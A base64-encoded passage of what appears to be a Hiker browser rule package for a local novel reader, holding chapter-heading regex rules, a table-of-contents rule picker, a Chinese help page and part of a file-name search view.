FsTnVtYmVyXFxcIjogMVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBcXFwiaWRcXFwiOiAtMyxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiBmYWxzZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIuebruW9lSjljLnphY3nroDku4spXFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIig/PD1b44CAXFxcXFxcXFxzXSkoPzooPzrlhoXlrrl85paH56ugKT/nroDku4t85paH5qGIfOWJjeiogHzluo/nq6B85qWU5a2QfOato+aWhyg/IeWujHznu5MpfOe7iOeroHzlkI7orrB85bC+5aOwfOeVquWklnznrKw/XFxcXFxcXFxzezAsNH1bXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXSs/XFxcXFxcXFxzezAsNH0oPzrnq6B86IqCKD8h6K++KXzljbd86ZuGKD8hW+WQiOWSjF0pfOmDqCg/IVvliIbotZvmuLhdKXzlm54oPyFb5ZCI5p2l5LqL5Y67XSl85Zy6KD8hW+WSjOWQiOavlOeUteaYr10pfOevhyg/IeW8oCkpKS57MCwzMH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIueugOS7iyDogIHlpKvor7jokZvmnZHlpKtcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDJcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTQsXFxuICAgICAgICBcXFwiZW5hYmxlXFxcIjogZmFsc2UsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCLnm67lvZUo5Y+k5YW444CB6L275bCP6K+05aSH55SoKVxcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCJeWyDjgIBcXFxcXFxcXHRdezAsNH0oPzrluo/nq6B85qWU5a2QfOato+aWhyg/IeWujHznu5MpfOe7iOeroHzlkI7orrB85bC+5aOwfOeVquWklnznrKw/XFxcXFxcXFxzezAsNH1bXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXSs/XFxcXFxcXFxzezAsNH0oPzrnq6B86IqCKD8h6K++KXzljbd86ZuGKD8hW+WQiOWSjF0pfOmDqCg/IVvliIbotZvmuLhdKXzlm54oPyFb5ZCI5p2l5LqL5Y67XSl85Zy6KD8hW+WSjOWQiOavlOeUteaYr10pfOivnXznr4coPyHlvKApKSkuezAsMzB9JFxcXCIsXFxuICAgICAgICBcXFwiZXhhbXBsZVxcXCI6IFxcXCLnrKzkuIDnq6Ag5q+U5LiK6Z2i5Y+q5aSa5LqG5Zue5ZKM6K+dXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiAzXFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC01LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IGZhbHNlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5pWw5a2XKOe6r+aVsOWtl+agh+mimClcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiKD88PVvjgIBcXFxcXFxcXHNdKVxcXFxcXFxcZCtcXFxcXFxcXC4/WyDjgIBcXFxcXFxcXHRdezAsNH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIjEyXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiA0XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC02LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IGZhbHNlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5aSn5YaZ5pWw5a2XKOe6r+aVsOWtl+agh+mimClcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiKD88PVvjgIBcXFxcXFxcXHNdKVvjgIfpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsMTJ9WyDjgIBcXFxcXFxcXHRdezAsNH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIuS4gOeZvuS4g+WNgVxcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogNFxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBcXFwiaWRcXFwiOiAtNyxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiB0cnVlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5pWw5a2XIOWIhumalOespiDmoIfpopjlkI3np7BcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiXlsg44CAXFxcXFxcXFx0XXswLDR9XFxcXFxcXFxkezEsNX1bOu+8miwu77yMIOOAgV/igJRcXFxcXFxcXC1dLnsxLDMwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwiMeOAgei/meS4quWwseaYr+agh+mimFxcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogNVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBcXFwiaWRcXFwiOiAtOCxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiB0cnVlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5aSn5YaZ5pWw5a2XIOWIhumalOespiDmoIfpopjlkI3np7BcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiXlsg44CAXFxcXFxcXFx0XXswLDR9KD865bqP56ugfOallOWtkHzmraPmlocoPyHlrox857uTKXznu4jnq6B85ZCO6K6wfOWwvuWjsHznlarlpJZ8W+OAh+mbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n117MSw4fSlbIOOAgV/igJRcXFxcXFxcXC1dLnsxLDMwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi5LiA44CB5Y+q5pyJ5YmN6Z2i55qE5pWw5a2X5pyJ5beu5YirXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiA2XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC05LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IHRydWUsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCLmraPmlocg5qCH6aKYL+W6j+WPt1xcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCJeWyDjgIBcXFxcXFxcXHRdezAsNH3mraPmlodbIOOAgF17MSw0fS57MCwyMH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIuato+aWhyDmiJHlpbbluLjlsbHotbXlrZDpvplcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDdcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTEwLFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IHRydWUsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCJDaGFwdGVyL1NlY3Rpb24vUGFydC9FcGlzb2RlIOW6j+WPtyDmoIfpophcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiXlsg44CAXFxcXFxcXFx0XXswLDR9KD86W0NjXWhhcHRlcnxbU3NdZWN0aW9ufFtQcF1hcnR877yw77yh77yy77y0fFtObl1bb09dXFxcXFxcXFwufFtFZV1waXNvZGV8KD865YaF5a65fOaWh+eroCk/566A5LuLfOaWh+ahiHzliY3oqIB85bqP56ugfOallOWtkHzmraPmlocoPyHlrox857uTKXznu4jnq6B85ZCO6K6wfOWwvuWjsHznlarlpJYpXFxcXFxcXFxzezAsNH1cXFxcXFxcXGR7MSw0fS57MCwzMH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIkNoYXB0ZXIgMSBNeUdyYW5kbWFJc05CXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiA4XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC0xMSxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiBmYWxzZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIkNoYXB0ZXIo5Y67566A5LuLKVxcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCJeWyDjgIBcXFxcXFxcXHRdezAsNH0oPzpbQ2NdaGFwdGVyfFtTc11lY3Rpb258W1BwXWFydHzvvLDvvKHvvLLvvLR8W05uXVtPb11cXFxcXFxcXC58W0VlXXBpc29kZSlcXFxcXFxcXHN7MCw0fVxcXFxcXFxcZHsxLDR9LnswLDMwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwiQ2hhcHRlciAxIE15R3JhbmRtYUlzTkJcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDlcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTEyLFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IHRydWUsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCLnibnmrornrKblj7cg5bqP5Y+3IOagh+mimFxcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCIoPzw9W1xcXFxcXFxcc+OAgF0pW+OAkOOAlOOAluOAjOOAjuOAiO+8u1xcXFxcXFxcW10oPzrnrKx8W0NjXWhhcHRlcilbXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDEwfVvnq6DoioJdLnswLDIwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi44CQ56ys5LiA56ugIOWQjumdoueahOespuWPt+WPr+S7peayoeaciVxcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogMTBcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTEzLFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IGZhbHNlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi54m55q6K56ym5Y+3IOagh+mimCjmiJDlr7kpXFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIig/PD1bXFxcXFxcXFxz44CAXXswLDR9KSg/OltcXFxcXFxcXFvjgIjjgIzjgI7jgJbjgJTjgIrvvIjjgJBcXFxcXFxcXChdLnsxLDMwfVtcXFxcXFxcXCnjgJHvvInjgIvjgJXjgJfjgI/jgI3jgIlcXFxcXFxcXF1dP3woPzrlhoXlrrl85paH56ugKT/nroDku4t85paH5qGIfOWJjeiogHzluo/nq6B85qWU5a2QfOato+aWhyg/IeWujHznu5MpfOe7iOeroHzlkI7orrB85bC+5aOwfOeVquWklilbIOOAgF17MCw0fSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi44CO5Yqg5Liq55u06KeS5byV5Y+35pu05LiT5Lia44CPXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiAxMVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBcXFwiaWRcXFwiOiAtMTQsXFxuICAgICAgICBcXFwiZW5hYmxlXFxcIjogdHJ1ZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIueJueauiuespuWPtyDmoIfpopgo5Y2V5LiqKVxcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCIoPzw9W1xcXFxcXFxcc+OAgF17MCw0fSkoPzpb4piG4piF4pym4pynXS57MSwzMH18KD865YaF5a65fOaWh+eroCk/566A5LuLfOaWh+ahiHzliY3oqIB85bqP56ugfOallOWtkHzmraPmlocoPyHlrox857uTKXznu4jnq6B85ZCO6K6wfOWwvuWjsHznlarlpJYpWyDjgIBdezAsNH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIuKYhuOAgeaZi+axn+S9nOiAheacgOWWnOasoueahOagvOW8j1xcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogMTJcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTE1LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IHRydWUsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCLnq6Av5Y23IOW6j+WPtyDmoIfpophcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiXlsgXFxcXFxcXFx044CAXXswLDR9KD86KD865YaF5a65fOaWh+eroCk/566A5LuLfOaWh+ahiHzliY3oqIB85bqP56ugfOallOWtkHzmraPmlocoPyHlrox857uTKXznu4jnq6B85ZCO6K6wfOWwvuWjsHznlarlpJZ8W+WNt+eroF1bXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDh9KVsg44CAXXswLDR9LnswLDMwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi5Y235LqUIOW8gOa6kOebm+S4llxcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogMTNcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTE2LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IGZhbHNlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi6aG25qC85qCH6aKYXFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIl5cXFxcXFxcXFMuezEsMjB9JFxcXCIsXFxuICAgICAgICBcXFwiZXhhbXBsZVxcXCI6IFxcXCLkuI3otoXov4cyMOS4quWtl+mhtuagvOWGmeeahOmDveaYr+agh+mimFxcXCIsXFxuICAgICAgICBcXFwic2VyaWFsTnVtYmVyXFxcIjogMTRcXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgXFxcImlkXFxcIjogLTE3LFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IGZhbHNlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5Y+M5qCH6aKYKOWJjeWQkSlcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiKD9tKSg/PD1bIFxcXFxcXFxcdOOAgF17MCw0fSnnrKxbXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDh956ugLnswLDMwfSQoPz1bXFxcXFxcXFxz44CAXXswLDh956ysW1xcXFxcXFxcZOmbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n117MSw4feeroClcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi56ys5LiA56ugIOecn+ato+eahOagh+mimOW5tuWBh+ijheaNouihjOesrOS4gOeroCDov5nkuKrkuI3opoFcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDE1XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC0xOCxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiBmYWxzZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIuWPjOagh+mimCjlkI7lkJEpXFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIig/bSkoPzw9WyBcXFxcXFxcXHTjgIBdezAsNH3nrKxbXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDh956ugLnswLDMwfSRbXFxcXFxcXFxz44CAXXswLDh9KeesrFtcXFxcXFxcXGTpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsOH3nq6AuezAsMzB9JFxcXCIsXFxuICAgICAgICBcXFwiZXhhbXBsZVxcXCI6IFxcXCLnrKzkuIDnq6Ag6L+Z5Liq5qCH6aKY5LiN6KaB5bm25YGH6KOF5o2i6KGM56ys5LiA56ug55yf5q2j55qE5qCH6aKYXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiAxNlxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBcXFwiaWRcXFwiOiAtMTksXFxuICAgICAgICBcXFwiZW5hYmxlXFxcIjogdHJ1ZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIuS5puWQjSDmi6zlj7cg5bqP5Y+3XFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIl4uezEsMjB9WyjvvIhdW1xcXFxcXFxcZOOAh+mbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n117MSw4fVsp77yJXVsg44CAXFxcXHRdezAsNH0kXFxcIixcXG4gICAgICAgIFxcXCJleGFtcGxlXFxcIjogXFxcIuagh+mimOWQjumdouaVsOWtl+acieaLrOWPtygxMilcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDE3XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC0yMCxcXG4gICAgICAgIFxcXCJlbmFibGVcXFwiOiB0cnVlLFxcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBcXFwi5Lmm5ZCNIOW6j+WPt1xcXCIsXFxuICAgICAgICBcXFwicnVsZVxcXCI6IFxcXCJeLnsxLDIwfVtcXFxcXFxcXGTjgIfpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsOH1bIOOAgFxcXFx0XXswLDR9JFxcXCIsXFxuICAgICAgICBcXFwiZXhhbXBsZVxcXCI6IFxcXCLmoIfpopjlkI7pnaLmlbDlrZfmsqHmnInmi6zlj7cxMjRcXFwiLFxcbiAgICAgICAgXFxcInNlcmlhbE51bWJlclxcXCI6IDE4XFxuICAgIH1cXG5dO1xcbmxldCBNYXRjaGVyID0gamF2YS51dGlsLnJlZ2V4Lk1hdGNoZXI7XFxubGV0IFBhdHRlcm4gPSBqYXZhLnV0aWwucmVnZXguUGF0dGVybjtcXG5cXG5mdW5jdGlvbiBnZXRUb2NSdWxlKGNvbnRlbnQpIHtcXG4gICAgbGV0IG1heENzID0gMTtcXG4gICAgbGV0IHRvY1BhdHRlcm4gPSBudWxsO1xcbiAgICBmb3IgKGxldCB0b2NSdWxlIG9mIHJ1bGVzKSB7XFxuICAgICAgICBpZiAoIXRvY1J1bGUuZW5hYmxlKSBjb250aW51ZTtcXG4gICAgICAgIGxldCBwYXR0ZXJuID0gUGF0dGVybi5jb21waWxlKHRvY1J1bGUucnVsZSwgUGF0dGVybi5NVUxUSUxJTkUpO1xcbiAgICAgICAgbGV0IG1hdGNoZXIgPSBwYXR0ZXJuLm1hdGNoZXIoY29udGVudCk7XFxuICAgICAgICBsZXQgY3MgPSAwO1xcbiAgICAgICAgd2hpbGUgKG1hdGNoZXIuZmluZCgpKSB7XFxuICAgICAgICAgICAgY3MrKztcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChjcyA+PSBtYXhDcykge1xcbiAgICAgICAgICAgIG1heENzID0gY3M7XFxuICAgICAgICAgICAgdG9jUGF0dGVybiA9IHBhdHRlcm47XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgcmV0dXJuIHRvY1BhdHRlcm47XFxufVxcbiQuZXhwb3J0cy5nZXRUb2NSdWxlID0gZ2V0VG9jUnVsZTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiNWLuW4ruWKqVwiLFwicGF0aFwiOlwiaGVscC52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5sZXQgaGVscFRleHQgPSB7XFxuICAgIFxcXCJ0eHRcXFwiOiBgXFxuICAgICAgICA8aDEgaWQ9XFxcInR4dOaYr+S7gOS5iFxcXCI+VFhU5piv5LuA5LmIPzwvaDE+XFxuICAgICAgICA8cD48YSBocmVmPVxcXCJodHRwczovL2JhaWtlLmJhaWR1LmNvbS9pdGVtL3R4dC8xMjE3MzMwXFxcIj7miJHlt7Lnu4/luK7kvaDnmb7luqbkuoY8L2E+77yb566A5Y2V5p2l6K+05bCx5piv5LiA56eN5YKo5a2Y5bCP6K+055qE5paH5Lu2KOaJqeWxleWQjTp0eHQp44CCPC9wPlxcbiAgICAgICAgPGgxIGlkPVxcXCLlpoLkvZXnlKjor6XlsI/nqIvluo/pmIXor7t0eHTlsI/or7RcXFwiPuWmguS9leeUqOivpeWwj+eoi+W6j+mYheivu3R4dOWwj+ivtD88L2gxPlxcbiAgICAgICAgPHA+5Zyo5Li76aG16Z2iIOKXiVRYVCDnlYzpnaLkuIvvvIzngrnlh7vlr7zlhaVUWFTvvIzpgInmi6nnm67moIflsI/or7Tmlofku7YodHh05paH5Lu277yMPGVtPuivpeaTjeS9nOS4jeS8muWIoOmZpHR4dOaWh+S7tu+8jOiAjOaYr2NvcHnkuIDku73liLDlsI/nqIvluo/nmoTot6/lvoTkuIs8L2VtPinvvIzlr7zlhaXlkI7lho3lnKgg4peJVFhUIOeVjOmdouS4i+mAieaLqeaDs+imgemYheivu+eahOWwj+ivtOWNs+WPr+OAgjwvcD5cXG5cXG4gICAgYCxcXG4gICAgXFxcIm5vdmVsQ29taWNcXFwiOiBgXFxuICAgICAgICA8aDEgaWQ9XFxcIui/meS4quWwj+eoi+W6j+acieS7gOS5iOeUqO+8n1xcXCI+6L+Z5Liq5bCP56iL5bqP5pyJ5LuA5LmI55So77yfPC9oMT5cXG4gICAgICAgIDx1bD5cXG4gICAgICAgIDxsaT48dT7ku6PnoIHkuIrkuLrlhbbku5blsI/nqIvluo8o5ryr55S757G7L+Wwj+ivtOexuynmj5DkvpvkuIvovb3mjqXlj6PjgII8L3U+PC9saT5cXG4gICAgICAgIDxsaT48dT7mnKzkvZPlhYXlvZPpmIXor7vlmajvvIzlj6/ku6XmtY/op4jnlKjor6XlsI/nqIvluo/mj5DkvpvnmoTkuIvovb3mjqXlj6Mo5LiK6Z2iKe+8jOS4i+i9veeahOa8q+eUuy/lsI/or7TjgII8L3U+PC9saT5cXG4gICAgICAgIDxsaT48dT7mj5DkvptUWFTmoLzlvI/lsI/or7Tmlofku7bop6PmnpDlip/og73jgII8L3U+XFxuICAgICAgICA8aDEgaWQ9XFxcIuS4uuS7gOS5iOWIl+ihqOmHjOS7gOS5iOmDveayoeeUqFxcXCI+5Li65LuA5LmI5YiX6KGo6YeM5LuA5LmI6YO95rKh55SoPzwvaDE+XFxuICAgICAgICA8dT7liJ3mrKHkvb/nlKjvvIzmsqHmnInlvojmraPluLjlkKfjgILwn6SUPC91PlxcbiAgICAgICAgPGgxIGlkPVxcXCLor6XlpoLkvZXmt7vliqDmvKvnlLvmiJblsI/or7RcXFwiPuivpeWmguS9lea3u+WKoOa8q+eUuyjmiJblsI/or7QpPzwvaDE+XFxuICAgICAgICA8dT4g5Zyo5LiA5Liq5pyJ5LiL6L295Yqf6IO955qE5bCP56iL5bqPKOa8q+eUu+exuy/lsI/or7Tnsbsp5Lit5LiL6L295LiA5pys5ryr55S7L+Wwj+ivtO+8jOi/lOWbnuivpeinhOWImeWNs+WPr+a1j+iniOOAgjwvdT48L2xpPlxcbiAgICAgICAgPC91bD5cXG4gICAgYFxcbn07XFxuc2V0UGFnZVRpdGxlKFxcXCLluK7liqlcXFwiKTtcXG5sZXQga2V5d29yZCA9IGdldFBhcmFtKFxcXCJrZXl3b3JkXFxcIik7XFxubGV0IHRleHQ7XFxuaWYgKGtleXdvcmQgPT09IHVuZGVmaW5lZCB8fCAhKHRleHQgPSBoZWxwVGV4dFtrZXl3b3JkXSkpIHtcXG4gICAgc2V0UmVzdWx0KFt7XFxuICAgICAgICB0aXRsZTogJzxoMSBzdHlsZT1cXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXCI+6LWE5paZ5LiN6KeB5ZKvPC9oMT4nLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxuICAgIH1dKTtcXG59IGVsc2Uge1xcbiAgICBzZXRSZXN1bHQoW3tcXG4gICAgICAgIHRpdGxlOiB0ZXh0LFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxuICAgIH1dKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJ0ZXh0XzFcIixcIm5hbWVcIjpcIiN2LuWkluWvvOaQnOe0olwiLFwicGF0aFwiOlwidHh0U2VhcmNoLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuXFxubGV0IHNlYXJjaFRlcm1zID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJzZWFyY2hUZXJtc1xcXCIpKTtcXG5zZXRQYWdlVGl0bGUoXFxcIuOAjFxcXCIgKyBzZWFyY2hUZXJtcyArIFxcXCLjgI3nmoTmkJzntKLnu5PmnpxcXFwiKTtcXG5sZXQgZGF0YSA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnLmV4dGVybmFsSW1wb3J0UGF0aCwgdW5kZWZpbmVkKTtcXG5kYXRhID0gZGF0YS5maWx0ZXIodiA9PiAvKFxcXFwudHh0fFxcXFwuZXB1YikkLy50ZXN0KHYubmFtZSkpO1xcblxcbmxldCB0ZXJtc0FyciA9IHNlYXJjaFRlcm1zLnNwbGl0KFxcXCJcXFwiKS5tYXAodCA9PiB0LnJlcGxhY2UoL1xcXFwqfFxcXFwufFxcXFw/fFxcXFwrfFxcXFwkfFxcXFxefFxcXFxbfFxcXFxdfFxcXFwofFxcXFwpfFxcXFx7fFxcXFx9fFxcXFx8fFxcXFwvfFxcXFxcXFxcL2csIGsgPT4gXFxcIlxcXFxcXFxcXFxcIiArIGspKTtcXG5sZXQgcmVnID0gbmV3IFJlZ0V4cCh0ZXJtc0Fyci5qb2luKFxcXCIuKlxcXCIpLCBcXFwiaVxcXCIpO1xcbmxldCBzZWFyY2hSZXN1bHQgPSBbXTtcXG5mb3IgKGxldCB0eHQgb2YgZGF0YSkge1xcbiAgICBpZiAocmVnLnRlc3QodHh0Lm5hbWUpKSB7XFxuICAgICAgICBsZXQgdHlwZSA9IHR4dC5uYW1lLnN1YnN0cmluZyh0eHQubmFtZS5sYXN0SW5kZXhPZihcXFwiLlxcXCIpKTtcXG4gICAgICAgIHNlYXJjaFJlc3VsdC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogdHh0Lm5hbWUsXFxuICAgICAgICAgICAgdXJsOiAodHlwZT09PVxcXCIudHh0XFxcIj9cXFwiaGlrZXI6Ly9wYWdlL3R4dFBhcnNlci52aWV3XFxcIjpcXFwiaGlrZXI6Ly9wYWdlL2VwdWJQYXJzZXIudmlldyNhdXRvQ2FjaGUjXFxcIikrXFxcIj9ydWxlPVxcXCIgKyBNWV9SVUxFLnRpdGxlLFxcbiAgICAgICAgICAgIGRlc2M6IHR4dC5wYXRoLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIHBhdGg6IHR4dC5wYXRoLFxcbiAgICAgICAgICAgICAgICBpc0NhY2hlOiB0cnVlLFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdHh0Lm5hbWVcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbn1cXG5pZiAoc2VhcmNoUmVzdWx0Lmxlbmd0aCA9PT0gMCkge1xcbiAgICBzZWFyY2hSZXN1bHQucHVzaCh7XFxuICAgI